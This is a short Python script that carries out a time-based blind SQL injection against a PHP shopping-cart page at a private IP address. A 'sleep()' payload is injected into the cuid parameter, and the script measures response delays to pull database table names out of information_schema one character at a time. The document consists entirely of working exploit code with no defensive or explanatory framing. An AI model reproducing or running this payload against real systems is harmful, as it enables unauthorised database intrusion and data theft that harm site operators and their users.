import time
import urllib

SLEEP_TIME = 1
MAX_TABLE_STRING = 18


sUrl = '''http://192.168.33.157/wiz/wizbag.php?BUYNUM=1&cuid=253'''

sUrl = sUrl + ''' and if(ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_type=0x62617365207461626c65 limit 0,1),%s,1)) = %s,sleep(%d),1)-- &GoodsPrice=22800&query=update_qty'''



def GetTableString(a_sUrlForm):
	a_sUrlForm = a_sUrlForm % ('%d','%s')

	for k in range(18):

		v_sUrlForm = a_sUrlForm % (k,'%d')
		GetTableCh(v_sUrlForm)


def GetTableCh(a_sUrlForm):
	for k in range(0x20,0x7B):
		v_sUrl = a_sUrlForm % (k)


		t1 = time.time()
		
		url = urllib.urlopen(v_sUrl)
		data = url.read()
		
		t2 = time.time()

		t3 = t2 - t1


		if(t3 > SLEEP_TIME):
			print chr(k),
		




#sFormUrl = sUrl % ('%s','%s',SLEEP_TIME)

sFormUrl = sUrl % ('%s','%s',SLEEP_TIME)


GetTableString(sFormUrl)


